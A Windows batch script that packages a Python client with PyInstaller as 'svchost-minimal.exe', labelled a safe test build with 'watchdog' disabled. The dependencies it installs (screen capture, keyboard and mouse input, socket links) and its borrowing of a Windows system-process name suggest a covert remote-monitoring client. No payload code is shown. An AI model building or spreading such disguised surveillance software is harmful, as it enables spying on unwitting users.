@echo off
echo ===============================================
echo  SAFE BUILD - No Watchdog Functionality
echo ===============================================
echo.
echo This build script creates a safe version of the client
echo with all watchdog functionality disabled for testing.
echo.

echo [1/6] Checking Python installation...
python --version
if errorlevel 1 (
    echo ERROR: Python not found! Please install Python first.
    pause
    exit /b 1
)

echo.
echo [2/6] Installing minimal required packages...
pip install pyinstaller psutil requests socketio mss pillow pynput lz4

echo.
echo [3/6] Verifying watchdog is NOT installed...
pip show watchdog >nul 2>&1
if not errorlevel 1 (
    echo WARNING: watchdog package is installed!
    echo Uninstalling for safety...
    pip uninstall -y watchdog
)

echo.
echo [4/6] Cleaning old build files...
if exist build rmdir /s /q build
if exist dist rmdir /s /q dist
if exist *.spec~ del /q *.spec~

echo.
echo [5/6] Building SAFE version (minimal dependencies, no watchdog)...
pyinstaller svchost-minimal.spec --clean --noconfirm

echo.
echo [6/6] Build complete!
echo.

if exist dist\svchost-minimal.exe (
    echo ===============================================
    echo  SUCCESS! Safe executable created!
    echo ===============================================
    echo.
    echo Location: dist\svchost-minimal.exe
    echo Features: Basic functionality only
    echo Safety:   No watchdog, console enabled
    echo.
    echo SAFETY NOTES:
    echo - Watchdog functionality is DISABLED
    echo - Console window enabled for monitoring
    echo - Minimal dependencies only
    echo - No admin privileges requested
    echo.
    echo To test: cd dist ^& svchost-minimal.exe
    echo.
) else (
    echo ===============================================
    echo  ERROR! Build failed!
    echo ===============================================
    echo Check the output above for errors.
    echo.
)

echo Press any key to exit...
pause >nul